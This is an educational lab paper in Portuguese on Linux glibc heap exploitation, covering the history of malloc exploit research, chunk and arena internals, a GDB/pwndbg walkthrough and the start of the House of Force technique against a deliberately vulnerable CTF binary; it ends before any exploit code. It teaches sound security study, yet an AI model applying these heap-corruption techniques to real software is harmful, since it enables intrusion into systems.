<h1 id="resumo">RESUMO</h1>

<p>Este estudo apresenta uma introdução às técnicas de exploração de memória dinâmica em binários para o sistema operacional Linux. Ao final deste laboratório, foi possível compreender a arquitetura da memória dinâmica e possíveis formas de explorar vulnerabilidades conhecidas, assim como entender suas mitigações.</p>

<h1 id="introdução">INTRODUÇÃO</h1>

<p>Desde 1998, quando a alocação de memória dinâmica foi implementada, houveram várias tentativas de exploração e sucessos pouco claros. Porém, em 11 de agosto de 2001, dois papers foram publicados com o intuito de demonstrar os “novos avanços” em exploração de vulnerabilidades. <code class="language-plaintext highlighter-rouge">MaXX</code> o autor do paper “<em>Vudo malloc tricks</em>” (encontrado em <a href="http://phrack.org/issues/57/8.html">phrack.org/issues/57/8.html</a>) descreveu a implementação básica e algoritmos da <code class="language-plaintext highlighter-rouge">GNU C Library</code> e apresentou ao público vários métodos para conseguir execução de código através de <code class="language-plaintext highlighter-rouge">heap overflow</code>. Ao mesmo tempo mostrou um exploit real da aplicação <code class="language-plaintext highlighter-rouge">sudo</code>.</p>

<p>Na mesma época, uma pessoa anônima escreveu um artigo chamado “<em>Once upon a free()</em>” (encontrado em <a href="http://phrack.org/issues/57/9.html">phrack.org/issues/57/9.html</a>) onde seu objetivo principal foi explicar sobre a implementação da <code class="language-plaintext highlighter-rouge">System V malloc</code>.</p>

<p>Em agosto de 2003 o artigo chamado “<em>Advanced
Doug Lea’s malloc exploits</em>” (encontrado em <a href="http://phrack.org/issues/61/6.html">phrack.org/issues/61/6.html</a>) publicado por <code class="language-plaintext highlighter-rouge">JP</code>, desenvolvia uma forma mais avançada de exploração baseada nos artigos anteriores. Este talvez, tenha sido a maior inspiração para o que estaria por vir.</p>

<p>Este artigo demonstrou duas técnicas de exploração:</p>

<ul>
  <li>método <code class="language-plaintext highlighter-rouge">unlink()</code></li>
  <li>método <code class="language-plaintext highlighter-rouge">frontlink()</code></li>
</ul>

<p>Estes métodos foram aplicados até o ano de 2004 quando a GLIBC foi mitigou estas vulnerabilidades e os exploits não funcionavam mais.</p>

<p>Porém, em outubro de 2005, uma pessoa identificada como <code class="language-plaintext highlighter-rouge">Phantasmal Phantasmagoria</code> publicou na <em>mailing list</em> da <code class="language-plaintext highlighter-rouge">bugtrack</code>, um artigo que chamou a atenção intitulado <em><code class="language-plaintext highlighter-rouge">Malloc Maleficarum</code></em> (encontrado em <a href="https://bugtraq.securityfocus.com/detail/20051011171415.9AE8233C23">bugtraq.securityfocus.com/detail/20051011171415.9AE8233C23</a>).</p>

<p><code class="language-plaintext highlighter-rouge">Phantasmal</code> também é o autor do artigo “<em>Exploiting the 
Wilderness</em>” (encontrado em <a href="https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20Heap%20Bug%20-%20Exploiting%20the%20wilderness%20-%20Phantasmal%20Phantasmagoria.txt">repository.root-me.org/</a>) também muito relevante na área.</p>

<p>O <em>Malloc Maleficarum</em> era um representação totalmente teórica do que se tornaria o avanço nas habilidades de exploração no que diz respeito a <em>heap</em>. Seu autor, separou cada uma das técnicas, as nomeando como:</p>

<ul>
  <li>The House of Prime</li>
  <li>The House of Mind</li>
  <li>The House of Force</li>
  <li>The House of Lore</li>
  <li>The House of Spirit</li>
  <li>The House of Chaos (conclusão)</li>
</ul>

<p>Este artigo abriu novamente os horizontes do que diz respeito a exploração da memória <em>heap</em>, porém a única falha deste artigo, é que ele não trazia nenhuma prova de conceito real para demonstrar as técnicas apresentadas.</p>

<p>Em janeiro de 2007, uma pessoa identificada como <code class="language-plaintext highlighter-rouge">K-sPecial</code> publicou um artigo chamado “<em>The House of Mind</em>” (encontrado em <a href="https://www.exploit-db.com/papers/13112">www.exploit-db.com/papers/13112</a>). Junto com este artigo, ele trouxe uma prova de conceito funcional, provando pela primeira vez de forma pública que a técnica de <code class="language-plaintext highlighter-rouge">The House of Mind</code> era real.</p>

<p>Ao longo dos anos seguintes, não só as demias técnicas do <em>Malloc Maleficarum</em> se provaram efetivas, como novas técnicas e “Houses” foram criadas.</p>

<p>Ao longo deste estudo, vamos entender primeiramente como a memória dinâmica é implementada no kernel Linux, assim como entender algumas das técnicas expressadas no <em>Malloc Maleficarum</em> de forma gradual.</p>

<h1 id="recursos">RECURSOS</h1>

<p>Durante a execução dos experimentos propostos neste documento, serão utilizados alguns recursos, todos podem ser encontrados de forma livre na internet. São eles:</p>

<ul>
  <li>GDB (<em>GNU Debugger</em>)</li>
  <li>GDB Server</li>
  <li>PWNDBG (encontrado em <a href="https://github.com/pwndbg/pwndbg#:~:text=Pwndbg%20is%20a%20Python%20module,to%20fill%20some%20these%20gaps.">github.com/pwndbg/pwndbg</a>)</li>
  <li>O módulo PWNTOOLS do Python</li>
  <li>one_gadget (encontrado em <a href="https://github.com/david942j/one_gadget">github.com/david942j/one_gadget</a>)</li>
  <li>Binários vulneráveis (encontrados em <a href="https://github.com/limitedeternity/HeapLAB">github.com/limitedeternity/HeapLAB</a>)</li>
</ul>

<h1 id="implementação-da-alocação-de-memória-dinâmica">IMPLEMENTAÇÃO DA ALOCAÇÃO DE MEMÓRIA DINÂMICA</h1>

<p>Antes de partirmos para prática, é necessário esclarecer alguns conceitos básicos sobre a implementação da <em>malloc</em>:</p>

<h2 id="glibc">GLIBC</h2>

<p>A <strong>GNU C Library</strong> (GLIBC) conforme descrito em sua documentação em <a href="https://www.gnu.org/software/libc/">gnu.org/software/libc/</a> fornece as bibliotecas do <em>core</em> para os sistemas GNU e GNU/Linux assim como diversos outros sistemas que utilizam o kernel Linux.</p>

<p>Estas bibliotecas fornecem APIs críticas que incluem algumas instalações fundamentais como <em>open, read, write, malloc, printf, exit…</em> entre diversas outras.</p>

<p>As bibliotecas GLIBC são <em>open source</em> e assumem a forma de <em>shared objects</em> ou objetos compartilhados, o equivalente no Linux as DLL no Windows e são uma parte fundamental dos sistemas operacionais Linux.</p>

<p>O uso da GLIBC é largamente utilizada nos ultimos 30 anos em ambos, desktop e sistemas embarcados, incluindo distribuições comuns como Debian, Ubuntu, Arch entre centenas.</p>

<p>As funções fornecidas pela GLIBC são utilizadas em programas escritos em C e C++ e como sonsequência, em linguagens de alto nível como Python, dos quais seus interpretadores são escritos em C.</p>

<p>De forma simples, nas infinidades de distribuições Linux, é difícil encontrar um processo que não mapeie um dos objetos compartilhados da GLIBC em memória.</p>

<p>No exemplo abaixo, será mostrado como a GLIBC é utilizada em uma aplicação Linux na distribuição Debian 11 LTS (<em>Long Term Support</em>).</p>

<p>Utilizando o “<strong>ldd</strong>” (<em>List Dynamic Dependences</em>) no programa “<code class="language-plaintext highlighter-rouge">/bin/ls</code>” para listar as bibliotecas utilizadas, podemos observar todas as bibliotecas necessárias para seu funcionamento, como a <code class="language-plaintext highlighter-rouge">libselinux</code> e <code class="language-plaintext highlighter-rouge">libpthread</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_1.png" alt="Bibliotecas utilizadas" /></p>

<p>Entre estas bibliotecas, existe uma chamada “<code class="language-plaintext highlighter-rouge">libc.so.6</code>”. Este é o objeto compartilhado da GLIBC. Onde <code class="language-plaintext highlighter-rouge">libc</code> é frequentemente a contração de GLIBC e o “<code class="language-plaintext highlighter-rouge">.so</code>” vem de <em>shared object</em> ou objeto compartilhado, o “<code class="language-plaintext highlighter-rouge">6</code>” é parte da <em>Linux Library ABI Versioning Convention</em> conhecida como <em><code class="language-plaintext highlighter-rouge">soname</code></em>. A referência para a <em>ABI Policy and Guidelines</em> pode ser encontrada em <a href="https://gcc.gnu.org/onlinedocs/libstdc++/manual/abi.html">gcc.gnu.org/onlinedocs/libstdc++/manual/abi.html</a>.</p>

<p>O comando <code class="language-plaintext highlighter-rouge">file</code> nos mostra que a <code class="language-plaintext highlighter-rouge">libc.so.6</code> é um link simbólico para a <code class="language-plaintext highlighter-rouge">libc-2.31.so</code> conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_2.png" alt="Link simbólico" /></p>

<p>Este é o objeto compartilhado atual, o <code class="language-plaintext highlighter-rouge">2.31</code> indica a versão da GLIBC que é diferente do <em>soname</em>.</p>

<p>A maior parte dos sistemas operacionais Linux, são distribuições com versões da GLIBC específica que não mudam durante o período de suporte.</p>

<p>No exemplo, vimos que o Debian 11 LTS utiliza a GLIBC 2.31 e vai continuar com esta versão pelos próximos cinco anos após seu lançamento. As excessões a esta regra, são distribuições como Arch Linux que atualizam suas versões da GLIBC constantemente.</p>

<p>Se executarmos o o objeto compartilhado da GLIBC, podemos ver não só sua versão, como a versão do GCC utilizada para compilá-lo, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_3.png" alt="Executando a GLIBC" /></p>

<p>Em resumo, esta biblioteca tem papel fundamental em um sistema operacional baseado no kernel do Linux, e suas funcionalidades.</p>

<h2 id="malloc">MALLOC</h2>

<p>Além das bibliotecas fundamentais, a GLIBC fornece um “alocador de memódia dinâmica” conhecido como <code class="language-plaintext highlighter-rouge">malloc</code>.</p>

<p>Os alocadores de memória dinâmica são utilizados quando um programa não consegue identificar o tamanho e/ou o número de objetos compartilhados que precisa para seu funcionamento em tempo de execução.</p>

<p>E o trabalho da <code class="language-plaintext highlighter-rouge">malloc</code> é simplesmente servir “pedaços” desta memória dinâmica, chamados de “<code class="language-plaintext highlighter-rouge">chunks</code>” em tempo de execução. Estes <code class="language-plaintext highlighter-rouge">chunks</code> são originados em grandes regiões da memória dinâmica chamados <code class="language-plaintext highlighter-rouge">heaps</code>.</p>

<p>Em um conceito abstrato, as <code class="language-plaintext highlighter-rouge">heaps</code> nada mais são do que grandes blocos de memória requisitados do kernel pela malloc.</p>

<p>Mesmo que um código em C ou C++ não invoque a malloc explicitamente, as chances que uma das bibliotecas utilizadas no código a utilize são grandes.</p>

<p>Operações básicas como iniciar uma nova <em>thread</em>, abrir um arquivo ou lidar com I/O, todas utilizam a malloc em <em>background</em>.</p>

<p>Portanto, como a malloc é largamente utilizada, combinada ao fato de que ela é usada em linguagens como C e C++, onde a corrupção de memória ainda é um problema, ela se torna um grande alvo para exploração.</p>

<h2 id="chunks">Chunks</h2>

<p><code class="language-plaintext highlighter-rouge">Chunks</code> são a unidade de memória fundamental na malloc, tomando a forma de pedaços da <code class="language-plaintext highlighter-rouge">heap</code>, embora eles também possam ser criados como uma entidade separada por uma chamada para o <code class="language-plaintext highlighter-rouge">mmap()</code>. A estrutura de um <em>chunk</em> consiste em um campo de tamanho, chamado de <em><code class="language-plaintext highlighter-rouge">size field</code></em> seguido do campo de “dados do usuário” chamado de <em><code class="language-plaintext highlighter-rouge">user data</code></em> que é o campo utilizado pelos programas. A figura abaixo representa o layout de um chunk.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_4.png" alt="Arquitetura do chunk" /></p>

<p>Enquanto os programas utilizam somente o campo <code class="language-plaintext highlighter-rouge">user data</code>, a malloc considera que o chunk começa 8 bytes antes do <code class="language-plaintext highlighter-rouge">size field</code>.</p>

<h3 id="size-field">Size field</h3>

<p>O <em>size field</em> tem um tamanho de 8 bytes e indica a quantidade de bytes utilizados pelo <em>user data</em> mais a quantidade de bytes do próprio <em>size field</em>.<br />
Exemplificando o valor do <em>size field</em>, com um chunk com 24 bytes de <em>user data</em> o <em>size field</em> terá o valor de “<code class="language-plaintext highlighter-rouge">0x20</code>” bytes, ou 32 bytes, que compreendem os 24 bytes solicutados pelo programa e reservados ao <em>user data</em>, mais os 8 bytes do próprio <em>size field</em>. O valor mínimo de um chunk é de <code class="language-plaintext highlighter-rouge">0x20</code> bytes.</p>

<p>O tamanho de um <em>chunk</em> aumenta em incrementos de 16 bytes, isso significa que, a partir do tamanho mínimo de <code class="language-plaintext highlighter-rouge">0x20</code> bytes de um <em>chunk</em>, o próximo tamanho possível é de <code class="language-plaintext highlighter-rouge">0x30</code> bytes, o próximo de <code class="language-plaintext highlighter-rouge">0x40</code> bytes e assim por diante.<br />
Uma particularidade do <em>size field</em>, é que a última parcela sognificante do seu valor não é usado para representar seu tamanho, mas sim para armazenar <em>flags</em> que indicam o estado do <em>chunk</em>. Estas <em>flags</em> podem ser:</p>

<ul>
  <li><strong>NON_MAIN_ARENA</strong> - Quando utilizado, indica que o <em>chunk</em> não pertence a <code class="language-plaintext highlighter-rouge">main arena</code> (detalhes sobre arenas mais abaixo)</li>
  <li><strong>IS_MAPPED</strong> - quando utilizado, indica que o <em>chunk</em> foi alocado via <code class="language-plaintext highlighter-rouge">mmap()</code></li>
  <li><strong>PREV_INUSE</strong> - Quando utilizado, indica que o <em>chunk</em> anterior está em uso, quando não utilizado, indica que o <em>chunk</em> anterior está livre.</li>
</ul>

<p>A imagem abaixo motra as <em>flags</em> na arquitetura do <em>chunk</em>:</p>

<p><img src="/img/papers/heap_p1/paper_heap1_5.png" alt="Arquitetura do chunk" /></p>

<h3 id="user-data-field">User data field</h3>

<p>O campo de <code class="language-plaintext highlighter-rouge">user data</code> contém a memória disponível para o processo que a requisitou. Este campo, pode conter informações relevantes para o <em>chunk</em>.</p>

<p>Tendo como fundamento de que um <em>chunk</em> pode ter somente 2 estados: <code class="language-plaintext highlighter-rouge">allocated</code> ou <code class="language-plaintext highlighter-rouge">free</code>, quando um chunk está livre, pode ser reaproveitado para armazenar informações sobre o fluxo de execução. Neste caso o primeiro <code class="language-plaintext highlighter-rouge">quadword</code> (8 bytes) é reaproveitado como um <code class="language-plaintext highlighter-rouge">foward pointer</code> (fd). O segundo <em>quadword</em> é reaproveitado como um <code class="language-plaintext highlighter-rouge">backward pointer</code> (bk). Os terceiro e quartos <em>quadwords</em> são reaproveitados como apontadores <code class="language-plaintext highlighter-rouge">fd_nextsize</code> e <code class="language-plaintext highlighter-rouge">bk_nextsize</code>  respectivamente. A partir do quinto <em>quadword</em>, o <em>user data</em> é reaproveitado para armazenar metadados ou se tornar parte do <em>chunk</em> seguinte.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_6.png" alt="Arquitetura do chunk" /></p>

<h2 id="heaps">Heaps</h2>

<p><code class="language-plaintext highlighter-rouge">Heaps</code> são blocos de memória adjacentes, dos quais a malloc aloca a processos. Elas podem ser criadas, aumentadas, separadas ou destruídas.</p>

<p>As <em>heaps</em> são administradas de formas diferentes, caso pertençam a uma <code class="language-plaintext highlighter-rouge">main arena</code> ou não. Uma <em>heap</em> que seja criada na primeira requisição de memória dinâmica, pertence a uma <code class="language-plaintext highlighter-rouge">main arena</code>, <em>heaps</em> para outras <code class="language-plaintext highlighter-rouge">arenas</code> são criadas pela função <code class="language-plaintext highlighter-rouge">new_heap()</code>.</p>

<p>Uma <em>heap</em> que faça parte de uma <code class="language-plaintext highlighter-rouge">main arena</code> pode ser aumentada ou separada pela <em>syscall</em> <code class="language-plaintext highlighter-rouge">brk()</code>, que por sua vez tem a função de requisitar mais memória, ou retornar memória para o kernel.</p>

<p>Uma <em>heap</em> que não pertença a uma <code class="language-plaintext highlighter-rouge">main arena</code> é criada com um tamanho fixo e seu tamanho pode ser manipulado com os comandos <code class="language-plaintext highlighter-rouge">grow_heap()</code> e <code class="language-plaintext highlighter-rouge">shrink_heap()</code> que aumentam ou diminuem o espaço para escrita. Estas também podem ser destruídas pela macro <code class="language-plaintext highlighter-rouge">delete_heap()</code>.</p>

<h2 id="arenas">Arenas</h2>

<p>A malloc administra os processos das <em>heaps</em> utilizando a estrutura <code class="language-plaintext highlighter-rouge">malloc_state</code>, conhecida como <code class="language-plaintext highlighter-rouge">arena</code>. Estas arenas consistem primordialmente em “bins”, que são utilizados para reciclar <em>chunks</em> livres da memória <em>heap</em>. Uma única arena, pode administrar multiplos <em>heaps</em> simultaneamente.</p>

<p>Novas arenas podem ser criadas através da função <code class="language-plaintext highlighter-rouge">_int_new_arena()</code> e inicializadas com <code class="language-plaintext highlighter-rouge">malloc_init_state()</code>.</p>

<p>A quantidade máxima de arenas concorrentes depende da quantidade de <em>cores</em> disponíveis para o processo.</p>

<h2 id="analisando-o-comportamento-em-tempo-de-execução">Analisando o comportamento em tempo de execução</h2>

<p>Para melhor compreensão de como é o comportamento da <em>heap</em> em tempo de execução, vamos analisar duas principais funções da malloc: a <code class="language-plaintext highlighter-rouge">malloc()</code> e a <code class="language-plaintext highlighter-rouge">free()</code>, que requisitam memória dinâmica ao kernel e liberam memória de volta para o kernell respectivamente.</p>

<h3 id="função-malloc">Função malloc()</h3>

<p>A princípio, pode ser um pouco confuso existir uma função chamada <code class="language-plaintext highlighter-rouge">malloc()</code> que requisita memória do alocador de memória dinâmica chamado malloc.</p>

<p>Porém, se trata de uma simples função que leva somente um argumento: a quantidade de bytes requisitados e retorna o *pointer para ele. A imagem abaixo exemplifica seu uso.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_7.png" alt="Formato da malloc()" /></p>

<p>E para visualizar como a memória <em>heap</em> é requisitada via <code class="language-plaintext highlighter-rouge">malloc()</code>, vamos “debugar” um pequeno e simples binário.</p>

<p>Como ferramentas para este laboratório, serão utilizadas os seguintes recursos:</p>

<ul>
  <li>Binários auxiliares obtidos no GitHub HeapLab (<a href="https://github.com/limitedeternity/HeapLAB">github.com/limitedeternity/HeapLAB</a>)</li>
  <li>GDB (GNU Debugger)</li>
  <li>O plugin PWNDBG (encontrado em <a href="https://github.com/pwndbg/pwndbg">github.com/pwndbg/pwndbg</a>)</li>
  <li>O binário “malloc” encontrado no material auxiliar deste paper</li>
</ul>

<p>Dentro do diretório do binário, podemos utilizar o comando <code class="language-plaintext highlighter-rouge">gdb malloc</code> que vai iniciar o binário junto ao gdb.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_8.png" alt="Iniciando o GDB" /></p>

<p>Antes de executar o binário em questão, podemos criar um <em>breakpoint</em> na função <code class="language-plaintext highlighter-rouge">main()</code> com o comando <code class="language-plaintext highlighter-rouge">breakpoint main</code> ou simplesmente <code class="language-plaintext highlighter-rouge">b main</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_9.png" alt="Breakpoint na main()" /></p>

<p>Com o <em>breakpoint</em> configurado, podemos executar o binário com o comando <code class="language-plaintext highlighter-rouge">run</code> ou simplesmente <code class="language-plaintext highlighter-rouge">r</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_10.png" alt="Tela inicial PWNDBG" /></p>

<p>O PWNDBG nos mostra um painel completo com várias informações sobre os movimentos de registradores que o binário está efetuando neste momento, assim como a <em>stack</em> e um painel chamado <code class="language-plaintext highlighter-rouge">SOURCE (CODE)</code>.</p>

<p>O painel SOURCE (CODE) nos mostra o código fonte do binário (que se encontra junto ao material auxiliar deste paper) e uma seta apontando a exata instrução onde o binário está parado no momento, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_11.png" alt="Source code" /></p>

<p>Podemos ver que a próxima instrução a ser executada é uma requisição de 9 bytes utilizando a função <code class="language-plaintext highlighter-rouge">malloc()</code>.</p>

<p>Antes de dar continuidade a execução, podemos visualizar o mapeamento da memória deste processo com o comando <code class="language-plaintext highlighter-rouge">vmmap</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_12.png" alt="VMMAP" /></p>

<p>No terminal utilizado para este experimento, podemos ver na legenda superior que a <em>heap</em> será indicada com a cor azul, porém no mapeamento ainda não existe nenhuma entrada na cor azul. isto acontece, porque neste momento da execução, ainda não existe nenhuma requisição de memória dinâmica feita pelo binário.</p>

<p>Podemos utilizar o comando <code class="language-plaintext highlighter-rouge">next</code> ou simplesmente <code class="language-plaintext highlighter-rouge">n</code> para avançar o binário para a próxima instrução.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_13.png" alt="Avançando a execução" /></p>

<p>Neste momento, é possível observar que o binário executou a primeira requisição de memória dinâmica, e está parada antes de executar a segunda, na linha 7 do código fonte.</p>

<p>Agora, ao checar a saída do comando <code class="language-plaintext highlighter-rouge">vmmap</code> podemos ver uma <em>heap</em> no endereço <code class="language-plaintext highlighter-rouge">0x602000</code> com o tamanho de <code class="language-plaintext highlighter-rouge">0x21000</code> bytes, ou pouco mais que 135000 bytes.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_14.png" alt="Heap" /></p>

<p>Também podemos inspecionar esta memória <em>heap</em> com o comando <code class="language-plaintext highlighter-rouge">vis_heap_chunks</code> ou simplesmente <code class="language-plaintext highlighter-rouge">vis</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_15.png" alt="Arquitetura do chunk" /></p>

<p>Nas cores do terminal utilizado no experimento, podemos ver os caracteres em ciano, que representam o primeiro <em>chunk</em> requisitado pela malloc com 9 bytes. Isto pode ser confirmado com o comando <code class="language-plaintext highlighter-rouge">print a</code> ou <code class="language-plaintext highlighter-rouge">p a</code> que vai nos mostrar que o valor de retorno desta chamada aponta para o primeiro <em>quadword</em> deste <em>chunk</em>, que representa nosso <code class="language-plaintext highlighter-rouge">user data</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_16.png" alt="Endereço da user data" /></p>

<p>A primeira coisa que podemos notar, é que mesmo requisitando somente 9 bytes, a <em>heap</em> alocou 3 <em>quadwords</em>, ou 24 bytes no <em>user data</em>, pois este é o tamanho de <em>chunk</em> minimo que a malloc oferece.</p>

<p>Se utilizarmos o comando <code class="language-plaintext highlighter-rouge">n</code> novamente, veremos que o programa requisitará somente 1 byte da memória.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_17.png" alt="Avançando a execução" /></p>

<p>E o comando <code class="language-plaintext highlighter-rouge">vis</code> nos mostra que ainda assim, a malloc alocou 24 bytes de memória.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_18.png" alt="Arquitetura do chunk" /></p>

<p>Mesmo solicitando 0 bytes com o comando <code class="language-plaintext highlighter-rouge">n</code> a malloc ainda aloca 24 bytes no <em>user data</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_19.png" alt="Avançando a execução" /></p>

<p>Neste ponto, é possível verificar que antes do campo <em>user data</em>, existe outro campo que ainda faz parte do mesmo chunk, conforme mostrado na imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_20.png" alt="Avançando a execução" /></p>

<p>Assim como uma <em>stack</em> armazena metadados próprios como endereços de retorno e apontadores, a malloc utiliza este campo para armazenar metadados da <em>heap</em> na própria <em>heap</em>, especificamente neste caso, o <em>size field</em>.</p>

<p>Todo <em>chunk</em> possui um <em>size field</em> indicando o tamanho total em bytes que compõem o <em>chunk</em>, incluindo o próprio <em>size field</em>. Então neste caso, temos 24 bytes de <em>user data</em>, mais 8 bytes de <em>size field</em> totalizando 32 ou <code class="language-plaintext highlighter-rouge">0x20</code> bytes. No entanto, estamos vendo <code class="language-plaintext highlighter-rouge">0x21</code> bytes, isso ocorre porque o <em>chunk</em> também carrega <em>flags</em> que são inseridas no último bit significante do byte. O acreścimeo de <code class="language-plaintext highlighter-rouge">0x01</code> ao tamanho do <em>chunk</em>, indica que a flag <code class="language-plaintext highlighter-rouge">_prev_inuse</code> está ativa e o <em>chunk</em> anterior está em uso.</p>

<p>O tamanho dos <em>chunks</em> cresce em incrementos de 16 bytes. Por exemplo, se utilizarmos o comando <code class="language-plaintext highlighter-rouge">n</code> para requisitar exatamente 24 bytes de memória <em>heap</em>, o comando <code class="language-plaintext highlighter-rouge">vis</code> nos mostra que alocamos um <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x20</code> bytes com exatamente 24 bytes de <em>user data</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_21.png" alt="Avançando a execução" /></p>

<p>Agora se avançarmos na execução do binário e solicitarmos 25 bytes de <em>user data</em>, <code class="language-plaintext highlighter-rouge">vis</code> nos mostra que desta vez o tamanho do <em>chunk</em> alocado é de <code class="language-plaintext highlighter-rouge">0x30</code> bytes com 40 bytes de <em>user data</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_22.png" alt="Avançando a execução" /></p>

<p>Por último, daremos atenção para o campo <code class="language-plaintext highlighter-rouge">top chunk</code> conforme mostrado na imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_23.png" alt="Chunk com 0x30 bytes" /></p>

<p>Se voltarmos ao comando <code class="language-plaintext highlighter-rouge">vmmap</code> veremos que quando executamos a <code class="language-plaintext highlighter-rouge">malloc()</code> da primeira vez, foi criado uma <em>heap</em> com <code class="language-plaintext highlighter-rouge">0x21000</code> bytes, ou pouco mais que 135.000 bytes. Mas neste momento, estamos vendo uma quantidade menor no <code class="language-plaintext highlighter-rouge">top chunk</code>.</p>

<p>Isto ocorre porque a malloc nos mostra o restante dos bytes da <em>heap</em>, como bytes não utilizados, indicando que a memória <em>heap</em> é um único e grande <em>chunk</em>   chamado de <code class="language-plaintext highlighter-rouge">top chunk</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_24.png" alt="Top chunk" /></p>

<p>Toda vez que solicitamos um <em>chunk</em> através da malloc, o <em>top chunk</em> é quebrado para fornecer bytes aos <em>chunks</em> solicitados diminuindo seu tamanho total, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_25.png" alt="Top chunk" /></p>

<p>A <em>top chunk</em>, assim como as demais também possui um <em>size field</em>, que indica a quantidade de bytes disponíveis para serem requisitados pela malloc.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_26.png" alt="Top chunk size" /></p>

<p>O <em>size field</em> do <em>top chunk</em> pode ser visto neste campo:</p>

<p><img src="/img/papers/heap_p1/paper_heap1_27.png" alt="Top chunk size" /></p>

<p>Uma observação importante sobre este campo, é que em muitas versões da GLIBC, o <em>size field</em> da top chunk não é submetido a nenhuma checagem de integridade, e isto se torna a base da técnica de exploração conhecida como <code class="language-plaintext highlighter-rouge">The House of Force</code>.</p>

<h1 id="the-house-of-force">THE HOUSE OF FORCE</h1>

<p>A técnica <code class="language-plaintext highlighter-rouge">The House of Force</code>, é uma das masi básicas possíveis em exploração de memória <em>heap</em> tendo sua principal vulnerabilidade o <em>overflow</em>.</p>

<p>Neste momento, vamos utilizar um simples binário escrito em C, para entender a base da técnica <code class="language-plaintext highlighter-rouge">The House of Force</code>. Este é um binário propositalmente vulnerável feito exatamente para o entendimento da vulnerabilidade.</p>

<p>Para explorarmos este binário, além das ferramentas já utilizadas anteriormente, vamos utilizar o módulo <code class="language-plaintext highlighter-rouge">pwntools</code> do Python.</p>

<h2 id="enumeração-do-binário">Enumeração do binário</h2>

<p>Para que o comportamento de um binário seja entendido, é necessário que seja enumerado, duas formas possíveis de enumerá-lo, é analisando seus mecanismos de proteção de forma passiva, e analisando seu comportamento em tempo de execução.</p>

<h3 id="enumerando-com-checksec">Enumerando com checksec</h3>

<p>Junto com o módulo pwntools, é instalada a ferramenta <code class="language-plaintext highlighter-rouge">checksec</code> que encontra dados sobre como um binário foi compilado compilado e algumas <em>flags</em> importantes sobre como podemos explorá-lo.<br />
Neste momento, vamos utilizar o binário <code class="language-plaintext highlighter-rouge">house_of_force</code> que se encontra no material complementar deste estudo. Utilizando o comando <code class="language-plaintext highlighter-rouge">checksec house_of_force</code> temos as primeiras informações sobre o binário.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_28.png" alt="Enumerando com checksec" /></p>

<p>Neste momento podemos identificar que se trata de um binário de 64 bits, conforme ressaltado na imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_29.png" alt="Arquitetura 64 bits" /></p>

<p>Também foi compilado com <code class="language-plaintext highlighter-rouge">Full RELRO</code>.</p>
<blockquote>
  <p><code class="language-plaintext highlighter-rouge">Partial RELRO</code> é uma mitigação que muda o layout das seções do programa, enquanto a <code class="language-plaintext highlighter-rouge">Full RELRO</code> também mapea algumas destas seções como <code class="language-plaintext highlighter-rouge">read only</code> após sua inicialização. Porém, uma vez que as explorações ocorrerão primordialmente na GLIBC, esta proteção não será problema.</p>
</blockquote>

<p><img src="/img/papers/heap_p1/paper_heap1_30.png" alt="Full RELRO" /></p>

<p>O binário também foi compilado utilizando <code class="language-plaintext highlighter-rouge">Stack Canary</code> que gera um <em>cookie</em> na pilha e checa sua integridade após a chamada de uma função, também é uma mitigação de exploração da qual não afetará a <em>heap</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_31.png" alt="Stack Canary" /></p>

<p>Este binário também foi compilado com o byte <code class="language-plaintext highlighter-rouge">NX</code> (<em>No eXecute</em>), também conhecido como <code class="language-plaintext highlighter-rouge">DEP</code> (<em>Data Execution Prevention</em>) esta também é uma mitigação de exploração que faz com que áreas como a <em>stack</em> não sejam executáveis, impedindo a execução de <em>shellcodes</em> diretamente da pilha.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_32.png" alt="Enumerando com checksec" /></p>

<p>Também podemos observar que este binário não tem o <code class="language-plaintext highlighter-rouge">PIE</code> (<em>Position Independent Executable</em>) ativado, o que significa que durante sua execução, saberemos os endereços na memória, pois eles serão estáticos.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_33.png" alt="No PIE" /></p>

<p>Por ultimo, o <code class="language-plaintext highlighter-rouge">RUNPATH</code> mostra que este binário vai procurar por bibliotecas GLIBC em um diretório em que o usuário pode controlar. Todos os binários deste estudo tem seu diretório de execução modificados, isto facilita a forma como podemos ligar os binários em diferentes versões da GLIBC. Em um cenário real, isto é irrelevante.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_34.png" alt="RUNPATH" /></p>

<h3 id="enumerando-em-tempo-de-execução">Enumerando em tempo de execução</h3>

<p>O binário <code class="language-plaintext highlighter-rouge">house_of_force</code> foi desenvolvido com a finalidade de explorar a técnica de exploração da <em>heap</em>. Ele tem o estilo CTF (<em>Capture the Flag</em>) e um <em>bug</em> proposital.</p>

<p>Para enumerar este binário em tempo de execução, vamos iniciá-lo no GDB e executá-lo sem nenhum <em>breakpoint</em>, conforme imagem abaixo.</p>

